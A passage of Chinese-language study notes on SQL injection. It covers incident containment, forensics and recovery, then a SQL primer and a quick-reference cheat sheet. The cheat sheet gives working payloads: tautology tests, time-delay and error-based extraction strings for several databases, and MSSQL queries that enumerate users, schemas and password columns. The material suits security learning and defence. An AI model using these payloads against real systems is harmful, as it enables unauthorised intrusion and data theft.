string">"OBJECT_SCHEMA"</span><span class="token punctuation">,</span><span class="token string">'PROCEDURE'</span> <span class="token keyword">as</span><span class="token string">"OBJECT_TYPE"</span> <span class="token keyword">from</span> pg_proc <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">select</span> tgname<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'TRIGGER'</span> <span class="token keyword">from</span> pg_trigger<span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">select</span> tablename<span class="token punctuation">,</span> schemaname<span class="token punctuation">,</span> <span class="token string">'TABLE'</span> <span class="token keyword">from</span> pg_tables <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">select</span> usename<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'USER'</span> <span class="token keyword">from</span> pg_user  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="如果你是受害者，该怎么办？"><a href="#如果你是受害者，该怎么办？" class="headerlink" title="如果你是受害者，该怎么办？"></a>如果你是受害者，该怎么办？</h3><h4 id="遏制安全事件"><a href="#遏制安全事件" class="headerlink" title="遏制安全事件"></a>遏制安全事件</h4><p>要遏制SQL注入攻击事件，可以简单地拔除受损害服务器的网线。</p><h4 id="评估涉及的数据"><a href="#评估涉及的数据" class="headerlink" title="评估涉及的数据"></a>评估涉及的数据</h4><ul><li><p>涉及信息的类型。</p></li><li><p>涉及的信息是否可辨识为个人信息还是组织机构的信息。</p></li><li><p>影响到哪些国家、州或省的人。</p></li><li><p>对数据执行了什么操作（更新、删除、修改或泄漏）。</p></li><li><p>重用未授权数据的影响。</p></li><li><p>任何缓解措施，比如数据加密，这可以降低未经授权的人重用这些信息的可能性。</p></li></ul><h4 id="通知相关人员"><a href="#通知相关人员" class="headerlink" title="通知相关人员"></a>通知相关人员</h4><p>要求委托管理个人信息的组织机构在数据安全遭受破坏时通知受影响的人员。</p><h4 id="确定攻击者在系统上执行了哪些操作？"><a href="#确定攻击者在系统上执行了哪些操作？" class="headerlink" title="确定攻击者在系统上执行了哪些操作？"></a>确定攻击者在系统上执行了哪些操作？</h4><ul><li><p>标识出攻击者查看到的信息。</p></li><li><p>识别出攻击者执行的DML和DDL操作，以及受影响的特定记录。</p></li><li><p>标识出事务之前和事务之后受影响的数据状态，以支持恢复数据库。</p></li><li><p>恢复之前己经被删除的数据。</p></li></ul><p>数据库取证资源</p><table><thead><tr><th align="center">RDBMS</th><th>图   书</th><th>专注于信息取证的Web网站</th><th>工   具</th></tr></thead><tbody><tr><td align="center">Microsoft  SQL  Server</td><td>SQL Server Forensic Analysis，Addison  Wesley Professional</td><td><a href="http://www.applicationfdrensics.com/">www.applicationfdrensics.com</a></td><td>Windows Forensic Toolchest  (SQL)</td></tr><tr><td align="center">Oracle</td><td>Oracle Forensics，  Rampant  Press</td><td><a href="http://www.red-databasesecurity.com/">www.red-databasesecurity.com</a>  <br><a href="http://www.v3rity.com/">www.v3rity.com</a><br><a href="http://www.applicationfbrensics.com/">www.applicationfbrensics.com</a></td><td>McAfee Security Scanner for  Databases</td></tr><tr><td align="center">MySQL</td><td>无</td><td><a href="http://www.applicationfbrensics.com/">www.applicationfbrensics.com</a></td><td>无</td></tr><tr><td align="center">PostgreSQL</td><td>无</td><td><a href="http://www.applicationfbrensics.com/">www.applicationfbrensics.com</a></td><td>无</td></tr></tbody></table><h4 id="从SQL注入攻击中恢复"><a href="#从SQL注入攻击中恢复" class="headerlink" title="从SQL注入攻击中恢复"></a>从SQL注入攻击中恢复</h4><p>静态有效载荷：从一个受损害系统到另外一个受损害系统，在后损害(post-compromise)系统上执行的活动是一致的。</p><p>动态有效载荷：从一个受损害系统到另外一个受损害系统，在后损害(post-compromise)系统上执行的活动是不一致的。</p><h5 id="确定攻击携带的有效载荷"><a href="#确定攻击携带的有效载荷" class="headerlink" title="确定攻击携带的有效载荷"></a>确定攻击携带的有效载荷</h5><p>执行下面的步骤，以识别成功SQL注入攻击的有效载荷：</p><ol><li><p>备份受损害数据库：为受损害数据库制作两份副本。一份用于恢复数据，另一份则作为干净的恢复点，以备在恢复出现问题时使用。</p></li><li><p>提取恶意的SQL注入查询，从受损害的Web服务器日志、数据库执行计划，包括从MySQL和PostgreSQL数据库服务器的statement log和binary logs中提取恶意查询和语句的唯一清单。</p></li><li><p>理解恶意查询的逻辑：检查列出的恶意查询和语句，确定它们所创建、访问、更新或删除的对象，以及攻击者如何实现这些操作。我们需要这些信息来确定安全事件影响的范围， 从而规划出恢复安全事件的步骤。</p></li><li><p>搜索恶意查询参考：我们可能己经具有己知恶意语句和命令的列表，可以使用该列表与之前提取的恶意查询清单相互比对，以识别恶意查询的来源。</p></li><li><p>确定恶意查询是静态有效载荷还是动态有效载荷的一部分：从搜索结果中可以确定， 攻击是与诸如SQL注入蠕虫这样的静态有效载荷有关，还是与攻击者使用SQL注入漏洞利用工具、投送传统即席查询(ad-hoc)的动态有效载荷有关。</p></li><li><p>查找多种漏洞：在恶意查询清单中检查所有的条目，因为同一 SQL注入漏洞可能会被多次利用，既可能使用静态有效载荷也可能通过动态有效载荷。</p></li></ol><h5 id="从携带静态有效载荷的攻击中恢复"><a href="#从携带静态有效载荷的攻击中恢复" class="headerlink" title="从携带静态有效载荷的攻击中恢复"></a>从携带静态有效载荷的攻击中恢复</h5><p>恢复的核心问题，是将数据库回滚到受攻击影响之前的状态，或者识别并取消 (undo)那些恶意查询和语句所执行的具体操作。</p><p>从携带静态有效载荷的攻击中进行恢复的步骤：</p><ol><li><p>恢复数据库状态</p><ul><li>从备份中恢复</li><li>标识要回滚的事务</li></ul></li><li><p>检验数据库服务器配置：如果静态有效载荷带有频繁针对RDBMS特性的攻击，或者解除服务器的安全配置以实现进一步的攻击，那么应该将数据库服务器的配置恢复到已知的良好状态。</p></li><li><p>识别并修复SQL注入漏洞：确保对整个代码库进行一次应用程序安全评估，以识别可被利用的漏洞和其他可能存在的情况。</p></li><li><p>在线恢复系统并恢复Web服务。</p></li></ol><h5 id="从携带动态有效载荷的攻击中恢复"><a href="#从携带动态有效载荷的攻击中恢复" class="headerlink" title="从携带动态有效载荷的攻击中恢复"></a>从携带动态有效载荷的攻击中恢复</h5><p>对于携带动态有效载荷的成功攻击，强烈建议聘请数据库取证专家进行调查取证。</p><p>可以遵循下列步骤：</p><ol><li><p>恢复数据库状态：对于动态有效载荷的SQL注入攻击，建议将RDBMS和操作系统都恢复到受损害之前的状态。</p></li><li><p>识别脱离数据库的活动：在之前收集好的恶意查询清单中，应该标识出那些允许攻击者脱离数据库服务器、进入底层操作系统的文件系统或注册表的语句。如果发现针对操作系统的活动，就应该执行下列操作：</p><ul><li>查找创建了带外通信的任何方法</li><li>查找对操作系统文件的引用，或者攻击者读取、创建或加载到数据库中的注册表键值 (key)。</li></ul></li><li><p>检验数据库服务器的配置：一旦攻击者获得对数据库服务器的访问之后，他就会解除存在的安全设置，以便进一步在服务器上实施攻击。</p></li><li><p>识别并修复SQL注入漏洞：确保对整个代码库进行一次应用程序安全评估，以识别可被利用的漏洞和其他可能存在的情况。</p></li><li><p>在线恢复系统并恢复Web服务。</p></li></ol><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><h3 id="SQL入门"><a href="#SQL入门" class="headerlink" title="SQL入门"></a>SQL入门</h3><h4 id="SQL查询"><a href="#SQL查询" class="headerlink" title="SQL查询"></a>SQL查询</h4><ol><li>SELEC丁语句</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> tblUsers<span class="token keyword">SELECT</span> username <span class="token keyword">FROM</span> tblUsers<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> tblUsers <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">AND</span> password <span class="token operator">=</span> <span class="token string">'letmein'</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">INTO</span> hackerTable <span class="token keyword">FROM</span> tblUsers<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>UNION运算符</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> tblUsers <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> tblAdmins<span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> tblUsers <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> tblAdmins<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li>INSERT 语句</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> tblUsers <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">'john'</span><span class="token punctuation">,</span><span class="token string">'smith'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> tblUsers<span class="token punctuation">(</span>id<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> priv<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'john'</span><span class="token punctuation">,</span><span class="token string">'smith'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="4"><li>UPDATE 语句</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> tblUsers <span class="token keyword">SET</span> priv<span class="token operator">=</span><span class="token number">0</span> <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'sarah'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>DELETE 语句</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DELETE</span> <span class="token keyword">FROM</span> tblUsers <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="6"><li>DROP语句</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> tblUsers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="7"><li>CREATE TABLE 语句</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> shoppinglist<span class="token punctuation">(</span>item <span class="token keyword">int</span><span class="token punctuation">,</span> name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> shoppinglist <span class="token keyword">as</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> dba_users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="8"><li>ALTER TABLE 语句</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> tblUsers <span class="token keyword">ADD</span> comments <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> tblUsers <span class="token keyword">DROP</span> <span class="token keyword">COLUMN</span> comments<span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> tblUsers <span class="token keyword">ALTER</span> <span class="token keyword">COLUMN</span> comments <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="9"><li>GROUP BY语句</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> customer<span class="token punctuation">,</span> <span class="token function">SUM</span><span class="token punctuation">(</span>cost<span class="token punctuation">)</span> <span class="token keyword">FROM</span> orders <span class="token keyword">WHERE</span> customer <span class="token operator">=</span> <span class="token string">'Anthony Anteater'</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> customer<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="10"><li>ORDER BY 子句</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> cost<span class="token punctuation">,</span>product <span class="token keyword">FROM</span> orders <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> <span class="token keyword">DESC</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="11"><li>限制结果集</li></ol><h3 id="SQL注入快速参考"><a href="#SQL注入快速参考" class="headerlink" title="SQL注入快速参考"></a>SQL注入快速参考</h3><h4 id="识别SQL注入漏洞"><a href="#识别SQL注入漏洞" class="headerlink" title="识别SQL注入漏洞"></a>识别SQL注入漏洞</h4><p>发现SQL注入缺陷</p><table><thead><tr><th>方   法</th><th>描   述</th></tr></thead><tbody><tr><td>异常的输入是否会产生数据库 错误？</td><td>输入SQL元字符或异常、错误的数据类型，有可能产生数据库错误。常见的测试用例包括在字符串字段中输入单引号(‘)字符，或者在数值字段中输入随机的字符串。通常可以通过HTTP状态代码500，或者页面中描述性的错误消息来识别这种数据库错误。提交异常数据并分析服务器响应中的下列字符串，有助于识别SQL注入漏洞：<br><code>Microsoft OLE DB Provider  ORA-  PLS-  error in your SQL Syntax  80040E14  SQL Error  Incorrect Syntax near  SQLServer  Failed MySQL  Unclosed Quotation Mark  JDBC Driver  ODBC Driver  SQL  ODBC  </code></td></tr><tr><td>合法、正确的输入是否可以替换 等效的SQL表达式？</td><td>如果遇到了错误，修改输入的数据以分析错误，确定输入的数据是否导致了SQL语法错误。例如，双倍使用单引号字符——如果一个引号导致了错误，而两个引号没有产生错误，那么很有可能存在未发现的SQL注入缺陷。请注意，由错误数据类型导致的错误可以是预期的并具有正常的表现。 例如，如果在需要数值的地方提供了字符串数据，那么很多应用程序将 产生错误。这时应该进一步采用其他技术来确认是否存在SQL注入漏洞。 在采用这种检测技术之前，判断所测试的输入对于服务器的响应是否有影响是很重要的。例如，如果提供了一个数值，那么尝试使用另一个不同的数值并确定是否产生了可度量且一致的差异。对于字符串值， 使用同一字符集，并将字符串值修改为一个相同长度的随机字符串， 然后观察应用程序的响应。如果对数据的修改并没有对页面长度、内容或HTTP响应代码产生一致的差别，那么该技术不太可能成功。</td></tr><tr><td>合法、正确的输入是否可以替换 等效的SQL表达式？</td><td>数值数据在这个例子中，我们将假定测试一个传递给news.php脚本的数值类型的ID参数。下面两个请求产生了不同的响应，因此可以认为ID参数是动态的，并且可以用于这种测试方法。<br><a href="http://target/news.php?ID=1">http://target/news.php?ID=1</a><br><a href="http://target/news.php?ID=2">http://target/news.php?ID=2</a> <br>在测试过程中，下一个步骤是提交一个SQL表达式，该表达式将被计算为事先确定好的正确值（比如上面例子中的1和2）。然后将对每一个表达式的响应与初始测试时的响应进行比较，以确定是否对该表达式  进行了计算。在这种类型的测试中，常用的SQL函数是ASCII(),对于所提供的ASCII字符，该函数将返回一个整数。因此，下面的SQL表达式应该返回值1( “2”的ASCT编码值是50)<br>51-ASCII(2) <br>如果我们的输入被SQL Server以不安全的方式解析，那么下列请求应该等价于原始的请求：<br><a href="http://target/news.php?ID=51-ASCII(2)">http://target/news.php?ID=51-ASCII(2)</a><br>– 等价手ID=1 <br><a href="http://target/news.php?ID=52-ASCII(2)">http://target/news.php?ID=52-ASCII(2)</a><br>– 等价手ID=2 <br>绝大多数主流数据库平台都支持ASCII()函数，包括Microsoft SQL  Server、Oracle、MySQL 和 PostgreSQL。 请使用类似的算术表达式来确认结果。字符串数据 当处理字符串数据时，可以采用与评估数值参数类似的方法。与前面的例子一样，第一步是从应用程序获取有效的值，并确定当改变该值时服务器的响应也一致地产生差异。在本例中，我们假定下面的请求参数值将产生不同的结果：<br><a href="http://target/products.asp?catagory=shoes">http://target/products.asp?catagory=shoes</a><br><a href="http://target/products.asp?catagory=blahfoo">http://target/products.asp?catagory=blahfoo</a><br>在测试字符串数据时，一种常用的策略是将字符串拆分为两个或多个子串，然后再使用SQL语法在服务器端将这些子串连接起来。一个重要的附加说明是：对于字符串的连接，需要根据数据库平台的不同采用不同的连接语法。由于我们可能事先知道是哪一种数据库服务器， 因此典型的办法是一开始就使用目标平台的字符串连接语法，比如  Microsoft SQL Server、Oracle 或 MySQL。下列 URL 实现了再造参数值”shoes”的字符串连接： <br>Microsoft  SQL Server  <a href="http://target/products.asp?catagory=sho%27+%27es(+%E6%98%AF+%E5%8F%B7%E7%9A%84URL%E7%BC%96%E7%A0%81)">http://target/products.asp?catagory=sho'%2b'es(%2b是+号的URL编码)</a><br>Oracle 或 PostgreSQL  <a href="http://target/products.asp?catagory=sho%27%7C%7C%27es">http://target/products.asp?catagory=sho'||'es</a> <br>MySQL  <a href="http://target/products.asp?catagory=sho%27%20%27es">http://target/products.asp?catagory=sho'%20'es</a>  (%20是空格字符的URL编码)改变连接操作符两侧的子串将使输入无效，并取回与其他任意随机字符串一致的结果。</td></tr><tr><td>在服务器的响应中，SQL条件表达式的附加部分是否产生一致 的差异性？</td><td>从统计角度讲，大多数SQL注入漏洞都发生在这样的情况下：当用户提供的数据被不安全地包含在操作数中，并被传递给WHERE子句时。 在下面的例子中，请注意URL和产生的SQL査询：  <br>URL: <a href="http://targetserver/news.php?id=100">http://targetserver/news.php?id=100</a>  <br>SQL: SELECT * FROM news WHERE article_id=100 <br>在正常的操作下，上面这个例子将取回并显示article_id值等于100的新闻文章。但是，如果参数id容易受到SQL注入&amp;击，那么下面的请求将产生不同的结果：<br>URL 1: <a href="http://targetserver/news.php?id=100">http://targetserver/news.php?id=100</a> and 1=1  URL 2: <a href="http://targetserver/news.php?id=100">http://targetserver/news.php?id=100</a> and 1=2  <br>通过添加”and 1=1”，在页面上应该看不到改变，因为从逻辑上来讲，该表达式并未改变WHERE子句的输出： <br> SELECT * FROM news WHERE article_id=100 and 1=1 相反，添加”and 1=2”意味着WHERE子句并不匹配数据库中的任何记录：<br>SELECT * FROM news WHERE article_id=100 and 1=2 通过使用这种技术操纵服务器的响应，我们常常可以识别SQL注入漏洞的存在。在某些情况下，可能需要通过关闭圆括号或者打破引号界定的数据，以便使用这种技术。例如，可以使用下面一系列的表达式：  <br>‘AND  ‘a’=’a Vs    ‘AND ‘a’=’b’  AND  1=1-Vs     ‘AND 1=2–  ) AND 1=1– Vs    ) AND 1=1–  ‘) AND 1=1-Vs     ‘) AND 1=2–</td></tr><tr><td>是否有可能触发可度量的时间 延迟？</td><td>通过SQL注入触发可度量的时间延迟，既可以用来确认是否存在缺陷， 在绝大多数情况下也可以用来识别后台数据库。</td></tr></tbody></table><h4 id="识别数据库平台"><a href="#识别数据库平台" class="headerlink" title="识别数据库平台"></a>识别数据库平台</h4><ol><li>通过时间延迟推理识别数据库平台</li></ol><p>产生时间延迟</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>平台</td><td>时间延迟</td></tr><tr><td>Microsoft SQL Server</td><td><code>WAITFOR DELAY 0:0:10'  </code></td></tr><tr><td>Oracle</td><td><code>BEGIN DBMS LOCK.SLEEP(5);END;-- (仅PL/SQL注入)</code><br><code>SELECT UTL_INADDR.get_host_name('192.168.0.1') FROM dual </code><br><code>SELECT UTL_INADDR.get_host_address('foo.nowhere999.zom'）FROM dual </code><br>SELECT UTL_HTTP.REOUEST(‘<a href="http://www.oracle.com/">http://www.oracle.com</a>‘) FROM dual</td></tr><tr><td>MySQL</td><td><code>BENCHMARK(1000000,MD5("HACK")) -- 低于5.0.12版本</code>  <code>SLEEP(10)-- 5.0.12 及更高版本</code></td></tr><tr><td>PostgreSQL</td><td><code>SELECT pg_sleep(10);-- 8.2 及更高版本</code> <br> <code>CREATE OR REPLACE FUNCTION  pg_sleep(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C'  STRICT;-- 在Linux上创建 pg_sleep 函数，要求 postgres/pgsql 级别的权限</code></td></tr></tbody></table><ol start="2"><li>通过SQL方言推理识别数据库平台</li></ol><p>SQL方言差异</p><table><thead><tr><th>平   台</th><th>连接符</th><th>行注释</th><th>唯一的默认表、变量或函数</th><th>Int转char函数</th></tr></thead><tbody><tr><td>Microsoft SQL Server</td><td>‘A’+’B’</td><td>–</td><td><code>@@PACK_RECEIVED</code></td><td><code>char(0*41)</code></td></tr><tr><td>Oracle</td><td>‘A’||’B’ concat(‘A’,’B’)</td><td>–</td><td><code>BITAND(1,1)</code></td><td><code>chr(65)</code></td></tr><tr><td>MySQL</td><td>concat(‘A’,’B’)  ‘A’ ‘B’</td><td>#</td><td><code>CONNECTION_ID()</code></td><td><code>char(0x41)</code></td></tr><tr><td>Access</td><td>“A” &amp; “B”</td><td>N/A</td><td><code>msysobjects</code></td><td><code>chr(65)</code></td></tr><tr><td>PostgreSQL</td><td>‘A’||’B’</td><td>–</td><td><code>getpgusemame()  </code></td><td><code> chr(65)</code></td></tr><tr><td>DB2</td><td>‘a’ concat ‘b’</td><td>–</td><td><code>sysibm.systables</code></td><td><code>chr(65)</code></td></tr></tbody></table><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#Microsoft SQL Server</span><span class="token string">'AND @@PACK_RECEIVED = @@PACK_RECEIVED -- '</span><span class="token comment">#MySQL</span><span class="token string">'AND CONNECTION_ID() = CONNECTION_ID()-- '</span><span class="token comment">#Oracle</span><span class="token string">'AND BITAND(1,1) = BITAND(1,1)-- '</span><span class="token comment">#PostgreSQL</span>'<span class="token operator">AND</span> getpgusername<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> getpgusername<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过错误消息提取数据</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#Microsoft SQL Server</span><span class="token operator">AND</span> <span class="token number">1</span> <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span><span class="token punctuation">(</span>Aversion<span class="token punctuation">)</span> <span class="token comment">-- </span><span class="token operator">AND</span> <span class="token number">1</span><span class="token operator">=</span><span class="token keyword">CONVERT</span><span class="token punctuation">(</span><span class="token keyword">INT</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> @<span class="token variable">@VERSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">-- </span><span class="token comment">#MySQL</span><span class="token operator">AND</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> VERSION<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token comment">#</span><span class="token comment">#Oracle</span><span class="token operator">AND</span> <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span>utl_inaddr<span class="token punctuation">.</span>get_host_name<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> banner <span class="token keyword">FROM</span> v$version <span class="token keyword">WHERE</span> rownum<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">-- </span><span class="token operator">AND</span> <span class="token number">1</span><span class="token operator">=</span>CTXSYS<span class="token punctuation">.</span>DRITHSX<span class="token punctuation">.</span>SN<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> banner <span class="token keyword">FROM</span> v$version <span class="token keyword">WHERE</span> rownum<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">-- </span><span class="token comment">#PostgreSQL</span><span class="token operator">AND</span> <span class="token number">1</span><span class="token operator">=</span>CAST<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>::<span class="token keyword">text</span> <span class="token keyword">AS</span> <span class="token keyword">NUMERIC</span><span class="token punctuation">)</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>将多行合并为单行</li></ol><p>使用SQL合并多行  </p><table><thead><tr><th>平   台</th><th>合并多行和（或）列的查询</th></tr></thead><tbody><tr><td>Microsoft SQL  Server</td><td><code>BEGIN DECLARE @x varchar (8000) SET @x=' '  SELECT @x=@x+'/'+name FROM sysobjects WHERE name&gt;'a' ORDER BY name END; SELECT @x AS DATA INTO foo</code> <br><code>-- populates the @x variable with all "name"column values from sysobjects table. Data from the @x variable is the stored in a table named foo under a column named data</code> <code>BEGIN DECLARE @x varchar(8000) SET @x=' '  SELECT @x=@x+'/'+name FROM sysobjects WHERE name&gt;'a' ORDER BY name; SELECT 1 WHERE 1 IN (SELECT @x) END;</code><br><code>-- As above but displays results with the sQL server error message</code><br> <code>SELECT name FROM sysobjects FOR XML RAW</code><br><code>-- returns the resultset as a single XML formatted string</code></td></tr><tr><td>Oracle</td><td>`SELECT sys.stragg(distinct username</td></tr><tr><td>MySQL</td><td><code>SELECT GROUP_CONCAT(user) FROM mysql.user;</code> <br><code>--Returns a comma separated list of  users.  </code></td></tr><tr><td>PostgreSQL</td><td><code>SELECT array_to_string(array(SELECT  datname FROM pg_database), ':');</code> <code>-- Returns a colon seperated list of database names </code></td></tr></tbody></table><h4 id="Microsoft-SQL-Server-备忘单"><a href="#Microsoft-SQL-Server-备忘单" class="headerlink" title="Microsoft SQL Server 备忘单"></a>Microsoft SQL Server 备忘单</h4><ol><li>枚举数据库配置信息和模式</li></ol><p>提取Microsoft SQL Server的配置信息</p><table><thead><tr><th>数   据</th><th>查  询</th></tr></thead><tbody><tr><td>版本</td><td><code>SELECT @@version;</code></td></tr><tr><td>当前用户</td><td><code>SELECT system user;</code><br><code>SELECT suser_sname();</code><br><code> SELECT user;</code><br><code> SELECT loginame FROM master..sysprocesses WHERE spid =@@SPID;</code></td></tr><tr><td>列出用户</td><td><code>SELECT name FROM master..syslogins;  </code></td></tr><tr><td>当前用户权限，如果用户为sysadmin，返回1;如果用户不具有sysadmin权限，返回0</td><td><code>SELECT is_srvolemenber('sysadmin');  </code></td></tr><tr><td>数据库服务器主机名</td><td><code>SELECT  @@ servername;</code><br><code>SELECT  SERVEROROPERTY('productversion'), SERVERPROPERTY('productlevel'),SERVERPROPERTY('edition');  -- 仅 SQL  Server 2005</code></td></tr></tbody></table><p>提取Microsoft SQL Server的模式信息</p><table><thead><tr><th>数   据</th><th>查   询</th></tr></thead><tbody><tr><td>当前数据库</td><td><code>SELECT DB_NAME();</code></td></tr><tr><td>列出数据库</td><td><code>SELECT name FROM master..sysdatabases;</code><br>  <code>SELECT DB NAME(N);</code><br><code>-- Where N is the database number </code></td></tr><tr><td>列出表</td><td>当前数据库中的表：<br><code>SELECT name FROM sysobjects WHERE xtype='u';</code><br><code>SELECT name FROM sysobjects WHERE xtype='V';--视图</code><br>master数据库中的表：<br><code>SELECT name FROM master..sysobjects WHERE xtype='U';</code><br><code>SELECT name FROM master..sysobjects WHERE xtype='V';</code></td></tr><tr><td>列出列</td><td>当前数据库中tblUsers表的列名：<br><code>SELECT name FROM syscolumns WHERE id=object_id('tblUsers');</code><br>admin数据库中tblUsers表的列名：<br><code>SELECT name FROM admin..syscolumns WHERE id=object_id('admin..tblmembers');</code></td></tr><tr><td>査找具有指定名称的列</td><td>查找指定的name <br><code>drop table pentest；begin declare@ret varchar(8000) set @ret=CHAR(58) select @ret=@ret+CHAR(32)+o.name+ CHAR(47)+c.name from syscolumns c,sysobjects o where c.name LIKE '%XXX%' and c.id=o.id and o.type='U' select @ret as ret into pentest end-</code><br>URL编码<br>查找名称中包含Pass的列名<br><code>drop table pentest;begin declare @ret varchar(8000) set @ret=CHAR(58) select @ret=@ret+CHAR(32)+o.name+CHAR(47)+c.name from syscolumns c,sysobjects o where (c.name LIKE'%[Pp][Aa][Ss][Ss]%' or c.name LIKE'%[Pp][Ww][Dd]%') and c.id=o.id and o.type='U' select @ret as ret into pentest end-</code><br>URL编码</td></tr><tr><td>在列中查找特定的值</td><td>对于指定的搜索字符串，返回数据库和列的名称，并将数据存储在foo数据库中<code>Drop table #Results;Drop table foo;CREATE 